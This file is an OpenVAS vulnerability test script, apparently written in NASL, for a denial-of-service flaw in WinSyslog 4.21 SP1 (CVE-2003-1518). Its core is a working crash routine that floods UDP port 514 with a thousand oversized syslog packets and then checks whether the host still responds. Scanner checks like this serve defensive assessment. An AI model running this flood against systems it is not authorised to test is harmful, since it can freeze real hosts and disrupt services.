# OpenVAS Vulnerability Test
# $Id: winsyslog_dos.nasl 17 2013-10-27 14:01:43Z jan $
# Description: WinSyslog (DoS)
#
# Authors:
# Matthew North
#
# Copyright:
# Copyright (C) 2003 Matthew North
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "WinSyslog is an enhanced syslog server for Windows. A vulnerability in the product allows 
remote attackers to cause the WinSyslog to freeze, which in turn will also freeze the operating 
system on which the product executes.
	
Vulnerable version: WinSyslog Version 4.21 SP1 (http://www.winsyslog.com)";

tag_solution = "contact vendor http://www.winsyslog.com";

if(description)
{
	script_id(11884);
	script_version("$Revision: 17 $");
	script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
	script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
	script_tag(name:"cvss_base", value:"7.8");
	script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_cve_id("CVE-2003-1518");
 script_bugtraq_id(8821);
    script_tag(name:"risk_factor", value:"High");
	name = "WinSyslog (DoS)";
	script_name(name);

	desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;

	script_description(desc);
        summary = "Attempts to crash the remote host";
	script_summary(summary);
	script_category(ACT_DENIAL);	# ACT_FLOOD?
	script_copyright("This script is Copyright (C) 2003 Matthew North");
	family = "Denial of Service";
  	script_dependencies('os_fingerprint.nasl');
	script_family(family);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
	exit(0);
}


include('global_settings.inc');
include('host_details.inc');

if (host_runs("Windows") != "yes") exit(0);

if ( report_paranoia < 2 ) exit(0);


soc = open_sock_udp(514);
if(!soc) exit(0);
start_denial();

for(i=0; i < 1000; i++) {
                        num = (600+i)*4;
			bufc = string(crap(num));
                        buf = string("<00>", bufc); 
	                send(socket:soc,data:buf);
            }

close(soc);
sleep(5);
alive = end_denial();
if(!alive)security_hole(port:514, proto:"udp");
